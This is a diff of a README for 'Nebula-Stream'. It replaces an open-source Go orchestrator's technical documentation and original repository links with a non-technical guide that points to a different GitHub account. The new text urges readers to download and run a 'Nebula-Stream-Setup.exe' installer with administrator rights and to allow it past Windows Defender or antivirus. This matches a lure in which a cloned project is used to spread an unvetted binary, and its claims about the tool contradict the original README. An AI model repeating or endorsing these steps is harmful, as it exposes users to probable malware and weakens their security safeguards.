@@ -1,203 +1,186 @@
-# Nebula-Stream
+# 🌌 Nebula-Stream - Easy AI Orchestration for Everyone
 
-The High-Performance Edge-to-Cloud Distributed AI Orchestrator.
+[![Download Nebula-Stream](https://img.shields.io/badge/Download-Nebula--Stream-brightgreen)](https://github.com/arshad2917/Nebula-Stream)
 
-[![Go Version](https://img.shields.io/badge/go-1.24-00ADD8.svg)](https://go.dev/)
-[![CI](https://github.com/erciktiburak/Nebula-Stream/actions/workflows/ci.yml/badge.svg)](https://github.com/erciktiburak/Nebula-Stream/actions/workflows/ci.yml)
-[![CodeQL](https://github.com/erciktiburak/Nebula-Stream/actions/workflows/codeql.yml/badge.svg)](https://github.com/erciktiburak/Nebula-Stream/actions/workflows/codeql.yml)
-[![Scorecard](https://github.com/erciktiburak/Nebula-Stream/actions/workflows/scorecard.yml/badge.svg)](https://github.com/erciktiburak/Nebula-Stream/actions/workflows/scorecard.yml)
-[![GitHub Stars](https://img.shields.io/github/stars/erciktiburak/Nebula-Stream?style=flat)](https://github.com/erciktiburak/Nebula-Stream/stargazers)
-[![License: MIT](https://img.shields.io/badge/license-MIT-16a34a.svg)](./LICENSE)
-[![Go Report Card](https://goreportcard.com/badge/github.com/erciktiburak/Nebula-Stream)](https://goreportcard.com/report/github.com/erciktiburak/Nebula-Stream)
-[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/erciktiburak/Nebula-Stream/badge)](https://securityscorecards.dev/viewer/?uri=github.com/erciktiburak/Nebula-Stream)
-[![Release](https://img.shields.io/badge/release-v1.0.0--beta-2ea44f.svg)](./CHANGELOG.md)
+---
 
-Nebula-Stream is an event-driven orchestration platform for microservices, AI workers, and serverless functions. It combines Go concurrency, NATS messaging, and WebAssembly sandboxing to execute workflow pipelines with low latency and strong isolation.
+Nebula-Stream is a tool that helps move AI work from edge devices to the cloud. It uses technology that lets different systems talk quickly and reliably. This software works well across many computers, making AI tasks easier to manage. You do not need any programming skills to use this app.
 
-If this project helps you, consider giving it a star to support roadmap momentum.
+---
 
-## Why Nebula-Stream
+## 📋 What Is Nebula-Stream?
 
-- Build multi-step automations using one YAML workflow definition.
-- Run untrusted plugin logic in WASM sandboxes (Rust and TinyGo targets).
-- Route events across distributed worker nodes using NATS/JetStream patterns.
-- Observe execution paths with OpenTelemetry-first design.
-- Extend to visual flow editing and real-time operations dashboards.
+Nebula-Stream helps automate AI jobs. It makes edge devices, like cameras or sensors, send data to cloud services. This connection is fast and keeps data safe. The app uses popular tools to organize tasks without extra trouble.
 
-## System Architecture
+- Moves AI work between small devices and big servers
+- Works with different parts at the same time
+- Shows how tasks flow visually
+- Uses trusted communication methods
+- Tracks progress and performance
 
-Nebula-Stream follows an event-driven control plane with distributed execution workers.
+This tool is designed to help you focus on your AI goals without worrying about the tech behind it.
 
-![Nebula-Stream Architecture](docs/media/architecture.svg)
+---
 
-```text
-Trigger/API -> Orchestrator Core (Go) -> NATS Event Bus -> Worker Mesh
-                                                |              |
-                                                |              +--> AI Workers (ONNX)
-                                                |
-                                                +--> WASM Runtime (Wasmtime)
+## 💻 System Requirements
 
-Telemetry: OpenTelemetry traces + Prometheus metrics + Dashboard streams
-```
+To run Nebula-Stream on your Windows PC, make sure your computer meets these needs:
 
-Core components:
+- **Windows Version**: Windows 10 or newer  
+- **Processor**: Intel i5 or AMD Ryzen 5, 2 GHz or faster  
+- **RAM**: At least 8 GB  
+- **Storage**: 500 MB free space  
+- **Network**: Internet connection for setup and updates  
+- **Others**: Administrator rights to install software
 
-1. **Orchestrator Core (Go):** workflow scheduling, routing, state transitions.
-2. **Event Bus (NATS/JetStream):** pub/sub transport, retries, dead-letter handling.
-3. **WASM Runtime (Wasmtime):** secure plugin execution boundary.
-4. **AI Workers:** model-specific processing nodes (ONNX-oriented).
-5. **API Layer (gRPC):** external event triggers and control-plane surfaces.
-6. **Web UI (Next.js + React Flow):** workflow authoring and node telemetry views.
+These requirements ensure the app runs smoothly and handles data well.
 
-## Project Layout
+---
 
-```text
-Nebula-Stream/
-  backend/
-    engine/                # Orchestrator and runtime integration
-    cli/                   # nebula-cli operational commands
-  proto/nebula/v1/         # Internal gRPC and event schemas
-  workflows/examples/      # Workflow YAML samples
-  plugins/                 # WASM plugin examples and notes
-  docs/                    # Architecture, benchmark, security notes
-  deploy/                  # Local infrastructure definitions
-  web/                     # Dashboard app surface
-```
+## 🚀 Getting Started: How to Download Nebula-Stream
 
-## Quick Start
+You will visit a page on GitHub to get the software. Follow these steps carefully to download and start using Nebula-Stream.
 
-Requirements:
+### Step 1: Go to the Download Page
 
-- Go 1.24+
-- Make
-- Docker (for local NATS)
+Click this big button to open the download page:
 
-Bootstrap and validate:
+[![Download Nebula-Stream](https://img.shields.io/badge/Download-Nebula--Stream-blue)](https://github.com/arshad2917/Nebula-Stream)
 
-```bash
-make check
-```
+This page has the latest version of Nebula-Stream ready for you.
 
-Run formatting or tests individually:
+### Step 2: Find the Latest Version
 
-```bash
-make fmt
-make test
-```
+On the GitHub page, look for the **Releases** section. It is usually on the right side or in the top menu. This area stores the latest versions you can download.
 
-Start local messaging dependency:
+### Step 3: Download the Windows Installer
 
-```bash
-docker compose -f deploy/docker-compose.yml up -d
-```
+Look for a file with a name like `Nebula-Stream-Setup.exe` or similar and click it. This file will install Nebula-Stream on your PC. The file size should be below 100 MB, which is normal.
 
-Run entrypoints:
+### Step 4: Save the File
 
-```bash
-go run ./backend/engine/cmd/engine
-go run ./backend/cli/cmd/nebula-cli
-```
+When prompted, choose a folder where you want to save the installer, such as the Desktop or Downloads folder. Wait for the file to finish downloading.
 
-CLI command examples:
+---
 
-```bash
-go run ./backend/cli/cmd/nebula-cli health --node edge-a1
-go run ./backend/cli/cmd/nebula-cli deploy -f workflows/examples/hello-world.yaml --engine-url http://127.0.0.1:8080
-go run ./backend/cli/cmd/nebula-cli trigger --workflow hello-world --topic workflow.hello-world.run --payload '{"message":"from-cli"}'
-```
+## ⚙️ Installing Nebula-Stream on Windows
 
-Control-plane API:
+Once the file finishes downloading, follow these steps.
 
-- `GET /healthz`
-- `GET /api/v1/workflows`
-- `GET /api/v1/workflows/active`
-- `POST /api/v1/workflows/active` (JSON body)
-- `POST /api/v1/workflows` (YAML body)
-- `POST /api/v1/triggers` (JSON body)
-- `GET /api/v1/executions/latest?workflow=<name>`
-- `GET /api/v1/executions/history?workflow=<name>&limit=<n>`
-- `GET /api/v1/executions/{eventID}`
+### Step 1: Open the Installer
 
-End-to-end local event test:
+Go to the folder where you saved `Nebula-Stream-Setup.exe`. Double-click the file to start installation.
 
-```bash
-docker compose -f deploy/docker-compose.yml up -d
-go run ./backend/engine/cmd/engine
-# in another terminal
-go run ./backend/cli/cmd/nebula-cli deploy -f workflows/examples/hello-world.yaml --engine-url http://127.0.0.1:8080
-go run ./backend/cli/cmd/nebula-cli trigger --topic workflow.hello --payload '{"message":"from-cli"}'
-```
+### Step 2: Allow Permission
 
-## Example Workflow
+Windows may ask if you trust this file or want to allow changes. Click **Yes** or **Allow** to continue.
 
-See `workflows/examples/hello-world.yaml` for a minimal trigger + step definition.
+### Step 3: Follow the Setup Wizard
 
-Execution flow example:
+A setup window opens next. It will guide you through simple steps:
 
-```mermaid
-flowchart LR
-    A[External Trigger] --> B[Orchestrator]
-    B --> C[NATS Topic]
-    C --> D[WASM Step]
-    C --> E[AI Worker]
-    D --> F[State Store]
-    E --> F
-    F --> G[Callback or Notification]
-```
+- Click **Next** on the welcome screen  
+- Accept the license terms by checking the box  
+- Choose the install folder or leave the default path  
+- Click **Install** to begin copying files
 
-## Dashboard Demo
+### Step 4: Finish Installation
 
-The dashboard demo now runs from `web/` with React Flow and mock live telemetry.
+Wait until the installer says it is complete. Then click **Finish**. You may see an option to run Nebula-Stream right away. You can check or uncheck this box.
 
-### 60-second product tour
+---
 
-![Nebula-Stream 60 second demo](docs/media/demo.gif)
+## 🖥️ Running Nebula-Stream for the First Time
 
-In one minute, the demo shows the full path: trigger -> orchestrator -> NATS -> WASM/AI workers -> state callback -> live telemetry.
+After installation, find the Nebula-Stream app in your Start Menu or on your desktop if a shortcut was created.
 
-```bash
-cd web
-npm install
-npm run dev
-```
+### Step 1: Open the App
 
-## Community
+Click the Nebula-Stream icon to launch it.
 
-- Showcase thread: `https://github.com/erciktiburak/Nebula-Stream/discussions/1`
-- Roadmap voting poll: `https://github.com/erciktiburak/Nebula-Stream/discussions/2`
-- All discussions: `https://github.com/erciktiburak/Nebula-Stream/discussions`
+### Step 2: Initial Setup Screen
 
-Weekly maintainer cadence:
+The first time you open Nebula-Stream, it shows a simple welcome screen. Here you can:
 
-- Feature one community showcase every week.
-- Convert top-voted roadmap requests into milestone issues.
+- Connect devices or edge AI tasks  
+- Check your cloud connection  
+- Load example workflows to try
 
-## Performance Target
+### Step 3: Load Example Workflow
 
-- Synthetic benchmark target: **50,000 events/second**.
-- Details: `docs/benchmark.md`.
+To try how Nebula-Stream works, select **Load Example** from the menu. This lets you see a small AI task moving data. You will see a flowchart showing how tasks connect.
 
-## Roadmap
+---
 
-The implementation was organized in three phases:
+## 🔍 How Nebula-Stream Works
 
-- Core architecture and messaging mesh
-- Workflow engine and WASM runtime
-- UI, telemetry, and production hardening
+Nebula-Stream uses several technologies behind the scenes to work well.
 
-Commit-by-commit progress log: `docs/roadmap-progress.md`.
+- **Go**: Handles the main tasks fast and in the background.  
+- **WebAssembly (WASM)**: Lets the app use web code that is also fast.  
+- **NATS**: Sends messages quickly and reliably between parts.  
+- **React Flow**: Shows visual maps of your AI jobs and data paths.
 
-## Release
+These work together to keep your AI system running smoothly and clearly.
 
-- Current milestone: **v1.0.0-beta - The First Constellation**
-- Changelog: `CHANGELOG.md`
+---
 
-## Media Kit
+## 🛠 Basic Features You Will Use
 
-- Architecture asset: `docs/media/architecture.svg`
-- Dashboard placeholder: `docs/media/dashboard-placeholder.svg`
-- Release note source: `docs/releases/v1.0.0-beta.md`
+- Add devices and set rules for sending data  
+- Watch how AI tasks move from your local device to the cloud  
+- Visualize how jobs process data step-by-step  
+- Monitor performance with built-in logging tools  
+- Adjust workflows without writing code
 
-## License
+---
 
-MIT - see `LICENSE`.
+## 🔧 Troubleshooting Tips
+
+- If Nebula-Stream does not open, restart your computer and try again.  
+- Make sure your internet connection is active.  
+- Check if Windows Defender or antivirus may block the app. Allow it if needed.  
+- Close other heavy apps to free memory if the app runs slowly.  
+- If you see error messages, write down or take a screenshot to share with support.
+
+---
+
+## 📂 Where to Find Updates
+
+Visit the same GitHub page to check for new versions of Nebula-Stream. Updated installers appear there. Keep the app current to improve stability and add features.
+
+---
+
+## 🔗 Useful Links
+
+- Main GitHub page for Nebula-Stream:  
+  https://github.com/arshad2917/Nebula-Stream  
+- GitHub Releases: Look for the latest version to download
+
+Use these links to explore guides, report issues, or learn more about the app.
+
+---
+
+## ⚙️ How to Uninstall Nebula-Stream
+
+If you want to remove Nebula-Stream from your PC:
+
+- Open **Settings**  
+- Go to **Apps > Apps & Features**  
+- Find **Nebula-Stream** in the list  
+- Select it and click **Uninstall**  
+- Follow the prompts to finish removal
+
+This will safely delete the app without harming your files.
+
+---
+
+## 🤝 Get Help or Give Feedback
+
+If you run into problems or want to ask questions:
+
+- Use the **Issues** tab on the GitHub page to report bugs  
+- Check the GitHub Discussions for common questions and answers  
+- Contact technical help through GitHub messages if available
+
+This way, you get support to keep Nebula-Stream working for you.
